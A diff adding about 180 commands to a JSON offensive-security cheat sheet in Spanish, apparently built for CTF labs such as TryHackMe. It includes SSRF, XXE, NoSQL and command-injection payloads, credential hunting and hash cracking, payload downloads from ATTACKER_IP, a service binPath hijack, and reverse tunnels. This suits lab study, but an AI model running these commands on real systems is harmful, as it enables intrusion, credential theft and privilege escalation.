@@ -2,7 +2,7 @@
   "generatedAt": "2026-07-06",
   "stats": {
     "totalSections": 19,
-    "totalCommands": 105,
+    "totalCommands": 286,
     "totalTags": 9
   },
   "tags": [
@@ -724,7 +724,35 @@
         "gobuster vhost -u $URL -w subdomains.txt --append-domain",
         "feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html",
         "katana -u $URL -d 3",
-        "arjun -u \"$URL/page.php\""
+        "arjun -u \"$URL/page.php\"",
+        "arjun -u \"$URL/api/endpoint\"",
+        "ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404",
+        "GET /api/users/1001",
+        "GET /api/users/1002",
+        "GET /api/orders/5",
+        "GET /api/orders/6",
+        "jwt_tool TOKEN",
+        "python3 - <<'PY'\nimport jwt\nprint(jwt.get_unverified_header('TOKEN'))\nprint(jwt.decode('TOKEN', options={'verify_signature': False}))\nPY",
+        "POST /graphql",
+        "{\"query\":\"{__schema{types{name}}}\"}",
+        "{\"query\":\"{users{id username email role}}\"}",
+        "url=http://127.0.0.1:80",
+        "url=http://localhost:8000",
+        "url=http://169.254.169.254/latest/meta-data/",
+        "url=http://[::1]/",
+        "url=file:///etc/passwd",
+        "<?xml version=\"1.0\"?>",
+        "<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
+        "<root>&xxe;</root>",
+        "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
+        "username[$ne]=admin&password[$ne]=x",
+        "{\"$where\":\"this.username=='admin'\"}",
+        "; id",
+        "&& id",
+        "| id",
+        "`id`",
+        "$(id)",
+        "%0Aid"
       ],
       "tables": [
         [
@@ -841,7 +869,7 @@
           ]
         ]
       ],
-      "searchText": "Web y APIs De discovery web a bugs de autorizacion, SSRF, JWT y uploads. Fingerprinting y discovery curl -i $URL/ whatweb -a 3 $URL ffuf -u \"$URL/FUZZ\" -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.html -fc 404 ffuf -u \"$URL/\" -H \"Host: FUZZ.target.local\" -w subdomains.txt -fs 0 gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -b 404 gobuster vhost -u $URL -w subdomains.txt --append-domain feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html katana -u $URL -d 3 arjun -u \"$URL/page.php\" Triage de bugs Bug Senales y prueba inicial LFI Parametros file/page/lang/template. Probar ../../../../etc/passwd y php://filter. SSTI Payloads {{7*7}}, ${7*7}, <%= 7*7 %>; confirmar motor antes de explotar. IDOR/BOLA Cambiar IDs entre usuarios. Si ves datos ajenos, hay autorizacion rota. JWT Revisar alg, kid, role, user_id, exp. Probar solo si el reto apunta a firma debil. GraphQL Introspection, tipos, queries/mutations con id/userId/admin/debug. SSRF Parametros url/webhook/avatar/import. Confirmar contra tu listener antes de localhost. XXE Entradas XML/SVG/SOAP/SAML/DOCX; probar entidad file:///etc/passwd en lab. Upload Extension, Content-Type, magic bytes, doble extension, ruta de ejecucion. Command injection host/ip/domain/filename. Confirmar con id/whoami/hostname o delay controlado."
+      "searchText": "Web y APIs De discovery web a bugs de autorizacion, SSRF, JWT y uploads. Fingerprinting y discovery curl -i $URL/ whatweb -a 3 $URL ffuf -u \"$URL/FUZZ\" -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.html -fc 404 ffuf -u \"$URL/\" -H \"Host: FUZZ.target.local\" -w subdomains.txt -fs 0 gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -b 404 gobuster vhost -u $URL -w subdomains.txt --append-domain feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html katana -u $URL -d 3 arjun -u \"$URL/page.php\" Triage de bugs Bug Senales y prueba inicial LFI Parametros file/page/lang/template. Probar ../../../../etc/passwd y php://filter. SSTI Payloads {{7*7}}, ${7*7}, <%= 7*7 %>; confirmar motor antes de explotar. IDOR/BOLA Cambiar IDs entre usuarios. Si ves datos ajenos, hay autorizacion rota. JWT Revisar alg, kid, role, user_id, exp. Probar solo si el reto apunta a firma debil. GraphQL Introspection, tipos, queries/mutations con id/userId/admin/debug. SSRF Parametros url/webhook/avatar/import. Confirmar contra tu listener antes de localhost. XXE Entradas XML/SVG/SOAP/SAML/DOCX; probar entidad file:///etc/passwd en lab. Upload Extension, Content-Type, magic bytes, doble extension, ruta de ejecucion. Command injection host/ip/domain/filename. Confirmar con id/whoami/hostname o delay controlado. arjun -u \"$URL/api/endpoint\" ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404 GET /api/users/1001 GET /api/users/1002 GET /api/orders/5 GET /api/orders/6 jwt_tool TOKEN python3 - <<'PY'\nimport jwt\nprint(jwt.get_unverified_header('TOKEN'))\nprint(jwt.decode('TOKEN', options={'verify_signature': False}))\nPY POST /graphql {\"query\":\"{__schema{types{name}}}\"} {\"query\":\"{users{id username email role}}\"} url=http://127.0.0.1:80 url=http://localhost:8000 url=http://169.254.169.254/latest/meta-data/ url=http://[::1]/ url=file:///etc/passwd <?xml version=\"1.0\"?> <!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]> <root>&xxe;</root> {\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}} username[$ne]=admin&password[$ne]=x {\"$where\":\"this.username=='admin'\"} ; id && id | id `id` $(id) %0Aid"
     },
     {
       "id": "section-07",
@@ -1060,7 +1088,34 @@
         "office2john doc.docx > office.hash",
         "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
         "john --show hash.txt",
-        "hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt"
+        "hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt",
+        "find / -name '*pass*' -o -name '*cred*' -o -name '*.kdbx' 2>/dev/null",
+        "grep -RniE 'pass|password|passwd|pwd|secret|token|api[_-]?key' /var/www /opt /home 2>/dev/null",
+        "find /home -name '.ssh' -type d 2>/dev/null",
+        "cat ~/.bash_history 2>/dev/null",
+        "ls -la /var/backups /backup /opt 2>/dev/null",
+        "cmdkey /list",
+        "dir /s /b *pass* *cred* *config* *backup* *.kdbx 2>nul",
+        "findstr /si password *.txt *.ini *.config *.xml *.json 2>nul",
+        "type %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul",
+        "type C:\\Windows\\Panther\\Unattend.xml 2>nul",
+        "rar2john secret.rar > rar.hash",
+        "office2john document.docx > office.hash",
+        "pdf2john file.pdf > pdf.hash",
+        "hashid hash.txt",
+        "hashcat --example-hashes | grep -i ntlm -n",
+        "hashcat -m 3200 bcrypt.hash /usr/share/wordlists/rockyou.txt",
+        "hashcat --show -m 1000 ntlm.hash",
+        "ssh user@$IP",
+        "smbclient -L //$IP -U 'user%password'",
+        "nxc smb $IP -u user -p password",
+        "nxc winrm $IP -u user -p password",
+        "mysql -h $IP -u user -p",
+        "sudo -l",
+        "keepass2john database.kdbx > keepass.hash",
+        "john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash",
+        "john --show keepass.hash",
+        "kpcli --kdb database.kdbx"
       ],
       "tables": [
         [
@@ -1147,7 +1202,7 @@
           ]
         ]
       ],
-      "searchText": "Credenciales y loot Buscar, convertir, crackear y reutilizar sin caos. Fuente Que mirar Web root .env, config.php, wp-config.php, web.config, appsettings.json. Homes .ssh, history, Desktop, Downloads, backups, notas. Shares Backups, IT, Dev, Deploy, SYSVOL, NETLOGON, scripts. Windows cmdkey, Unattend.xml, PowerShell history, IIS configs. Linux /var/www, /opt, /var/backups, cron scripts, bash history. Conversiones frecuentes ssh2john id_rsa > id_rsa.hash keepass2john vault.kdbx > keepass.hash zip2john secret.zip > zip.hash office2john doc.docx > office.hash john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt john --show hash.txt hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt Etiqueta cada credencial por fuente y servicio probado. Despues de cada credencial valida, reenumera: shares, sudo, WinRM, DB, panel web, LDAP. En AD evita spraying agresivo; usa usuarios reales y una password candidata con control."
+      "searchText": "Credenciales y loot Buscar, convertir, crackear y reutilizar sin caos. Fuente Que mirar Web root .env, config.php, wp-config.php, web.config, appsettings.json. Homes .ssh, history, Desktop, Downloads, backups, notas. Shares Backups, IT, Dev, Deploy, SYSVOL, NETLOGON, scripts. Windows cmdkey, Unattend.xml, PowerShell history, IIS configs. Linux /var/www, /opt, /var/backups, cron scripts, bash history. Conversiones frecuentes ssh2john id_rsa > id_rsa.hash keepass2john vault.kdbx > keepass.hash zip2john secret.zip > zip.hash office2john doc.docx > office.hash john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt john --show hash.txt hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt Etiqueta cada credencial por fuente y servicio probado. Despues de cada credencial valida, reenumera: shares, sudo, WinRM, DB, panel web, LDAP. En AD evita spraying agresivo; usa usuarios reales y una password candidata con control. find / -name '*pass*' -o -name '*cred*' -o -name '*.kdbx' 2>/dev/null grep -RniE 'pass|password|passwd|pwd|secret|token|api[_-]?key' /var/www /opt /home 2>/dev/null find /home -name '.ssh' -type d 2>/dev/null cat ~/.bash_history 2>/dev/null ls -la /var/backups /backup /opt 2>/dev/null cmdkey /list dir /s /b *pass* *cred* *config* *backup* *.kdbx 2>nul findstr /si password *.txt *.ini *.config *.xml *.json 2>nul type %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul type C:\\Windows\\Panther\\Unattend.xml 2>nul rar2john secret.rar > rar.hash office2john document.docx > office.hash pdf2john file.pdf > pdf.hash hashid hash.txt hashcat --example-hashes | grep -i ntlm -n hashcat -m 3200 bcrypt.hash /usr/share/wordlists/rockyou.txt hashcat --show -m 1000 ntlm.hash ssh user@$IP smbclient -L //$IP -U 'user%password' nxc smb $IP -u user -p password nxc winrm $IP -u user -p password mysql -h $IP -u user -p sudo -l keepass2john database.kdbx > keepass.hash john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash john --show keepass.hash kpcli --kdb database.kdbx"
     },
     {
       "id": "section-10",
@@ -1394,7 +1449,43 @@
         "sc query state= all",
         "wmic service get name,displayname,pathname,startmode",
         "schtasks /query /fo LIST /v",
-        "cmdkey /list"
+        "cmdkey /list",
+        "whoami /user",
+        "hostname",
+        "cd",
+        "echo %USERNAME%",
+        "echo %USERDOMAIN%",
+        "ver",
+        "powershell -NoProfile -ExecutionPolicy Bypass",
+        "certutil -urlcache -split -f http://ATTACKER_IP:8000/winPEASx64.exe C:\\Windows\\Temp\\winpeas.exe",
+        "powershell -c \"iwr http://ATTACKER_IP:8000/winPEASx64.exe -OutFile C:\\Windows\\Temp\\winpeas.exe\"",
+        "C:\\Windows\\Temp\\winpeas.exe",
+        "wmic os get Caption,Version,BuildNumber,OSArchitecture",
+        "wmic product get name,version 2>nul",
+        "dir \"C:\\Program Files\"",
+        "dir \"C:\\Program Files (x86)\"",
+        "wmic service get name,displayname,pathname,startmode | findstr /i \"Auto\"",
+        "sc qc SERVICIO",
+        "accesschk.exe -uwcqv \"Authenticated Users\" *",
+        "accesschk.exe -uwcqv %USERNAME% SERVICIO",
+        "sc config SERVICIO binPath= \"cmd /c C:\\Windows\\Temp\\shell.exe\"",
+        "sc stop SERVICIO",
+        "sc start SERVICIO",
+        "wmic service get name,pathname,startmode | findstr /i /v \"C:\\Windows\" | findstr /i /v '\"'",
+        "icacls \"C:\\Program Files\"",
+        "icacls \"C:\\Program Files\\Vendor App\"",
+        "dir C:\\Windows\\Tasks",
+        "dir C:\\Windows\\System32\\Tasks /s /b",
+        "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+        "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+        "msiexec /quiet /qn /i C:\\Windows\\Temp\\payload.msi",
+        "dir /s /b *pass* *cred* *config* *backup* 2>nul",
+        "findstr /si password *.txt *.ini *.config *.xml 2>nul",
+        "type C:\\Windows\\Panther\\Unattend.xml 2>nul",
+        "type C:\\Windows\\Panther\\Unattended.xml 2>nul",
+        "type %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul"
       ],
       "tables": [
         [
@@ -1487,7 +1578,7 @@
           ]
         ]
       ],
-      "searchText": "Windows privesc Post-exploit Windows fuera de AD. whoami whoami /groups whoami /priv systeminfo wmic qfe get Caption,Description,HotFixID,InstalledOn sc query state= all wmic service get name,displayname,pathname,startmode schtasks /query /fo LIST /v cmdkey /list Vector Senal Servicios debiles Puedes cambiar binPath, reiniciar servicio o sustituir ejecutable. Unquoted service path Ruta con espacios sin comillas y directorio intermedio escribible. AlwaysInstallElevated HKCU y HKLM Installer AlwaysInstallElevated a 1. Tareas programadas Script/binario ejecutado por usuario superior en ruta escribible. SeImpersonatePrivilege Potato/PrintSpoofer/RoguePotato segun version y restricciones del lab. SeBackupPrivilege Lectura de archivos protegidos, SAM/SYSTEM o datos sensibles. Credenciales IIS configs, web.config, PowerShell history, Unattend.xml, cmdkey."
+      "searchText": "Windows privesc Post-exploit Windows fuera de AD. whoami whoami /groups whoami /priv systeminfo wmic qfe get Caption,Description,HotFixID,InstalledOn sc query state= all wmic service get name,displayname,pathname,startmode schtasks /query /fo LIST /v cmdkey /list Vector Senal Servicios debiles Puedes cambiar binPath, reiniciar servicio o sustituir ejecutable. Unquoted service path Ruta con espacios sin comillas y directorio intermedio escribible. AlwaysInstallElevated HKCU y HKLM Installer AlwaysInstallElevated a 1. Tareas programadas Script/binario ejecutado por usuario superior en ruta escribible. SeImpersonatePrivilege Potato/PrintSpoofer/RoguePotato segun version y restricciones del lab. SeBackupPrivilege Lectura de archivos protegidos, SAM/SYSTEM o datos sensibles. Credenciales IIS configs, web.config, PowerShell history, Unattend.xml, cmdkey. whoami /user hostname cd echo %USERNAME% echo %USERDOMAIN% ver powershell -NoProfile -ExecutionPolicy Bypass certutil -urlcache -split -f http://ATTACKER_IP:8000/winPEASx64.exe C:\\Windows\\Temp\\winpeas.exe powershell -c \"iwr http://ATTACKER_IP:8000/winPEASx64.exe -OutFile C:\\Windows\\Temp\\winpeas.exe\" C:\\Windows\\Temp\\winpeas.exe wmic os get Caption,Version,BuildNumber,OSArchitecture wmic product get name,version 2>nul dir \"C:\\Program Files\" dir \"C:\\Program Files (x86)\" wmic service get name,displayname,pathname,startmode | findstr /i \"Auto\" sc qc SERVICIO accesschk.exe -uwcqv \"Authenticated Users\" * accesschk.exe -uwcqv %USERNAME% SERVICIO sc config SERVICIO binPath= \"cmd /c C:\\Windows\\Temp\\shell.exe\" sc stop SERVICIO sc start SERVICIO wmic service get name,pathname,startmode | findstr /i /v \"C:\\Windows\" | findstr /i /v '\"' icacls \"C:\\Program Files\" icacls \"C:\\Program Files\\Vendor App\" dir C:\\Windows\\Tasks dir C:\\Windows\\System32\\Tasks /s /b reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated msiexec /quiet /qn /i C:\\Windows\\Temp\\payload.msi dir /s /b *pass* *cred* *config* *backup* 2>nul findstr /si password *.txt *.ini *.config *.xml 2>nul type C:\\Windows\\Panther\\Unattend.xml 2>nul type C:\\Windows\\Panther\\Unattended.xml 2>nul type %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul"
     },
     {
       "id": "section-13",
@@ -1629,7 +1720,45 @@
         "chisel server -p 8000 --reverse",
         "./chisel client ATTACKER_IP:8000 R:socks",
         "# Ligolo: ruta a red interna",
-        "sudo ip route add 10.10.20.0/24 dev ligolo"
+        "sudo ip route add 10.10.20.0/24 dev ligolo",
+        "ip a",
+        "ip route",
+        "ss -tulpen",
+        "netstat -ano",
+        "hostname -I",
+        "cat /etc/hosts",
+        "arp -a",
+        "# Local forward: exponer servicio interno en tu Kali",
+        "curl http://127.0.0.1:8080",
+        "# SOCKS proxy para multiples destinos",
+        "# Reverse forward: cuando el pivot puede salir hacia ti",
+        "ssh -R 9001:127.0.0.1:9001 user@ATTACKER_IP",
+        "# Atacante",
+        "# Victima/pivot: SOCKS reverse hacia atacante",
+        "# Atacante: usar SOCKS",
+        "proxychains curl http://10.10.20.5/",
+        "# Forward especifico",
+        "./chisel client ATTACKER_IP:8000 R:8080:127.0.0.1:80",
+        "# Atacante",
+        "sudo ip tuntap add user $USER mode tun ligolo",
+        "sudo ip link set ligolo up",
+        "./proxy -selfcert -laddr 0.0.0.0:11601",
+        "# Pivot",
+        "./agent -connect ATTACKER_IP:11601 -ignore-cert",
+        "# En consola ligolo",
+        "session",
+        "ifconfig",
+        "start",
+        "# Atacante: ruta hacia red interna",
+        "nmap -Pn -sT -p80,445 10.10.20.5",
+        "echo 'socks5 127.0.0.1 1080' | sudo tee -a /etc/proxychains4.conf",
+        "proxychains curl http://10.10.20.5/",
+        "proxychains nmap -sT -Pn -n -p80,445 10.10.20.5",
+        "proxychains crackmapexec smb 10.10.20.5 -u USER -p PASS",
+        "cat /etc/resolv.conf",
+        "nslookup intranet.local DNS_INTERNO",
+        "dig @DNS_INTERNO intranet.local",
+        "echo '10.10.20.5 intranet.local' | sudo tee -a /etc/hosts"
       ],
       "tables": [
         [
@@ -1715,7 +1844,7 @@
           ]
         ]
       ],
-      "searchText": "Pivoting Cuando el target ve servicios que tu Kali no ve. Situacion Tecnica Tengo SSH al pivot ssh -L para servicio concreto, ssh -D para SOCKS. No tengo SSH pero ejecuto binarios chisel reverse o ligolo-ng. Necesito escanear varios hosts ligolo-ng con interfaz tun y rutas. Solo necesito una web interna Forward local especifico. Hostnames internos Resolver DNS interno o anadir /etc/hosts. # SSH local forward ssh -L 8080:127.0.0.1:80 user@$IP # SOCKS ssh -D 1080 -N user@$IP proxychains nmap -sT -Pn -p80,445 10.10.20.5 # Chisel reverse SOCKS chisel server -p 8000 --reverse ./chisel client ATTACKER_IP:8000 R:socks # Ligolo: ruta a red interna sudo ip route add 10.10.20.0/24 dev ligolo Valida con curl/nc antes de escanear. Con proxychains usa -sT, no SYN scan. Documenta atacante -> pivot -> red interna -> servicio."
+      "searchText": "Pivoting Cuando el target ve servicios que tu Kali no ve. Situacion Tecnica Tengo SSH al pivot ssh -L para servicio concreto, ssh -D para SOCKS. No tengo SSH pero ejecuto binarios chisel reverse o ligolo-ng. Necesito escanear varios hosts ligolo-ng con interfaz tun y rutas. Solo necesito una web interna Forward local especifico. Hostnames internos Resolver DNS interno o anadir /etc/hosts. # SSH local forward ssh -L 8080:127.0.0.1:80 user@$IP # SOCKS ssh -D 1080 -N user@$IP proxychains nmap -sT -Pn -p80,445 10.10.20.5 # Chisel reverse SOCKS chisel server -p 8000 --reverse ./chisel client ATTACKER_IP:8000 R:socks # Ligolo: ruta a red interna sudo ip route add 10.10.20.0/24 dev ligolo Valida con curl/nc antes de escanear. Con proxychains usa -sT, no SYN scan. Documenta atacante -> pivot -> red interna -> servicio. ip a ip route ss -tulpen netstat -ano hostname -I cat /etc/hosts arp -a # Local forward: exponer servicio interno en tu Kali curl http://127.0.0.1:8080 # SOCKS proxy para multiples destinos # Reverse forward: cuando el pivot puede salir hacia ti ssh -R 9001:127.0.0.1:9001 user@ATTACKER_IP # Atacante # Victima/pivot: SOCKS reverse hacia atacante # Atacante: usar SOCKS proxychains curl http://10.10.20.5/ # Forward especifico ./chisel client ATTACKER_IP:8000 R:8080:127.0.0.1:80 # Atacante sudo ip tuntap add user $USER mode tun ligolo sudo ip link set ligolo up ./proxy -selfcert -laddr 0.0.0.0:11601 # Pivot ./agent -connect ATTACKER_IP:11601 -ignore-cert # En consola ligolo session ifconfig start # Atacante: ruta hacia red interna nmap -Pn -sT -p80,445 10.10.20.5 echo 'socks5 127.0.0.1 1080' | sudo tee -a /etc/proxychains4.conf proxychains curl http://10.10.20.5/ proxychains nmap -sT -Pn -n -p80,445 10.10.20.5 proxychains crackmapexec smb 10.10.20.5 -u USER -p PASS cat /etc/resolv.conf nslookup intranet.local DNS_INTERNO dig @DNS_INTERNO intranet.local echo '10.10.20.5 intranet.local' | sudo tee -a /etc/hosts"
     },
     {
       "id": "section-15",
@@ -1732,7 +1861,26 @@
         "sed -n '1,220p' exploit.py",
         "grep -nEi 'rm|del|format|shutdown|useradd|chmod|curl|wget|socket|subprocess' exploit.py",
         "python3 exploit.py -h",
-        "python3 exploit.py --check --url $URL"
+        "python3 exploit.py --check --url $URL",
+        "nmap -sC -sV -p PUERTO $IP",
+        "curl -i $URL/",
+        "whatweb -a 3 $URL",
+        "banner grab: nc -nv $IP PUERTO",
+        "grep -nEi \"rm|del|format|shutdown|useradd|chmod|curl|wget|socket|subprocess\" exploit.py",
+        "# 1. Probar reachability",
+        "curl -i $URL/vulnerable/path",
+        "# 2. Reproducir manualmente la parte minima",
+        "curl -i -X POST $URL/endpoint -d 'param=test'",
+        "# 3. Ejecutar PoC en modo check si existe",
+        "file exploit.c",
+        "grep -nEi \"socket|connect|system|popen|exec|fork|unlink|remove\" exploit.c",
+        "gcc exploit.c -o exploit",
+        "./exploit --help",
+        "mkdir -p evidence exploit notes",
+        "cp exploit.py exploit/original_exploit.py",
+        "script -a evidence/exploit_run.log",
+        "# ejecutar prueba",
+        "exit"
       ],
       "tables": [
         [
@@ -1813,7 +1961,7 @@
           ]
         ]
       ],
-      "searchText": "CVE y exploits Usar PoCs sin ejecutar basura a ciegas. Pregunta Decision Coincide producto exacto? Si no, baja prioridad. Coincide rango de version? Si esta fuera, descarta o busca config concreta. Requiere credenciales? Separar pre-auth de post-auth. Requiere admin? Solo sirve si ya tienes ese rol. Es destructivo? Evitar DoS/wipers salvo que el lab lo pida claramente. searchsploit PRODUCT VERSION sed -n '1,220p' exploit.py grep -nEi 'rm|del|format|shutdown|useradd|chmod|curl|wget|socket|subprocess' exploit.py python3 exploit.py -h python3 exploit.py --check --url $URL Primero reproduce la peticion minima con curl/Burp. Cambia payloads por comandos inocuos: id, whoami, hostname. Guarda fuente, version detectada, cambios hechos y output de exito."
+      "searchText": "CVE y exploits Usar PoCs sin ejecutar basura a ciegas. Pregunta Decision Coincide producto exacto? Si no, baja prioridad. Coincide rango de version? Si esta fuera, descarta o busca config concreta. Requiere credenciales? Separar pre-auth de post-auth. Requiere admin? Solo sirve si ya tienes ese rol. Es destructivo? Evitar DoS/wipers salvo que el lab lo pida claramente. searchsploit PRODUCT VERSION sed -n '1,220p' exploit.py grep -nEi 'rm|del|format|shutdown|useradd|chmod|curl|wget|socket|subprocess' exploit.py python3 exploit.py -h python3 exploit.py --check --url $URL Primero reproduce la peticion minima con curl/Burp. Cambia payloads por comandos inocuos: id, whoami, hostname. Guarda fuente, version detectada, cambios hechos y output de exito. nmap -sC -sV -p PUERTO $IP curl -i $URL/ whatweb -a 3 $URL banner grab: nc -nv $IP PUERTO grep -nEi \"rm|del|format|shutdown|useradd|chmod|curl|wget|socket|subprocess\" exploit.py # 1. Probar reachability curl -i $URL/vulnerable/path # 2. Reproducir manualmente la parte minima curl -i -X POST $URL/endpoint -d 'param=test' # 3. Ejecutar PoC en modo check si existe file exploit.c grep -nEi \"socket|connect|system|popen|exec|fork|unlink|remove\" exploit.c gcc exploit.c -o exploit ./exploit --help mkdir -p evidence exploit notes cp exploit.py exploit/original_exploit.py script -a evidence/exploit_run.log # ejecutar prueba exit"
     },
     {
       "id": "section-16",
@@ -2153,7 +2301,40 @@
         "- Acceso inicial:",
         "- Escalada:",
         "- Flags:",
-        "- Root cause:"
+        "- Root cause:",
+        "mkdir -p nmap web loot creds hashes screenshots exploits notes",
+        "touch notes/00-index.md notes/creds.md notes/commands.md notes/timeline.md",
+        "- Nombre:",
+        "- Plataforma: TryHackMe",
+        "- Fecha:",
+        "- Objetivo:",
+        "- VPN/AttackBox:",
+        "## Comando",
+        "Fecha/hora:",
+        "Contexto:",
+        "Comando:",
+        "Resultado importante:",
+        "Archivo de evidencia:",
+        "Decision desbloqueada:",
+        "| Usuario | Password/Hash | Fuente | Servicio probado | Resultado |",
+        "| --- | --- | --- | --- | --- |",
+        "| user | pass | /var/www/config.php | ssh/smb/web | ssh OK |",
+        "1. Recon: puertos abiertos y tecnologia.",
+        "2. Enumeracion: hallazgo clave.",
+        "3. Acceso inicial: vector exacto.",
+        "4. Post-exploit: usuario y permisos.",
+        "5. Privesc: misconfig explotada.",
+        "6. Flags: rutas y evidencia.",
+        "7. Root cause: por que funciono.",
+        "## Hallazgo",
+        "- Titulo:",
+        "- Impacto:",
+        "- Precondiciones:",
+        "- Evidencia:",
+        "- Pasos reproducibles:",
+        "- Comandos minimos:",
+        "- Resultado:",
+        "- Mitigacion teorica:"
       ],
       "tables": [
         [
@@ -2236,7 +2417,7 @@
           ]
         ]
       ],
-      "searchText": "Notas y cierre Que registrar para no perderte y poder repetir la cadena. Plantilla minima # Room - IP: - Hostnames: - Dominio: - Puertos: - Credenciales: - Hallazgo clave: - Acceso inicial: - Escalada: - Flags: - Root cause: Registro Contenido Superficie Puerto, servicio, version, evidencia y siguiente prueba. Comando Contexto, comando, resultado importante y decision desbloqueada. Credenciales Usuario, password/hash, fuente, servicio probado y resultado. Hallazgo Impacto, precondiciones, pasos reproducibles, evidencia y mitigacion teorica. Cierre Comandos minimos para reproducir user/root y falsos caminos relevantes."
+      "searchText": "Notas y cierre Que registrar para no perderte y poder repetir la cadena. Plantilla minima # Room - IP: - Hostnames: - Dominio: - Puertos: - Credenciales: - Hallazgo clave: - Acceso inicial: - Escalada: - Flags: - Root cause: Registro Contenido Superficie Puerto, servicio, version, evidencia y siguiente prueba. Comando Contexto, comando, resultado importante y decision desbloqueada. Credenciales Usuario, password/hash, fuente, servicio probado y resultado. Hallazgo Impacto, precondiciones, pasos reproducibles, evidencia y mitigacion teorica. Cierre Comandos minimos para reproducir user/root y falsos caminos relevantes. mkdir -p nmap web loot creds hashes screenshots exploits notes touch notes/00-index.md notes/creds.md notes/commands.md notes/timeline.md - Nombre: - Plataforma: TryHackMe - Fecha: - Objetivo: - VPN/AttackBox: ## Comando Fecha/hora: Contexto: Comando: Resultado importante: Archivo de evidencia: Decision desbloqueada: | Usuario | Password/Hash | Fuente | Servicio probado | Resultado | | --- | --- | --- | --- | --- | | user | pass | /var/www/config.php | ssh/smb/web | ssh OK | 1. Recon: puertos abiertos y tecnologia. 2. Enumeracion: hallazgo clave. 3. Acceso inicial: vector exacto. 4. Post-exploit: usuario y permisos. 5. Privesc: misconfig explotada. 6. Flags: rutas y evidencia. 7. Root cause: por que funciono. ## Hallazgo - Titulo: - Impacto: - Precondiciones: - Evidencia: - Pasos reproducibles: - Comandos minimos: - Resultado: - Mitigacion teorica:"
     },
     {
       "id": "section-19",
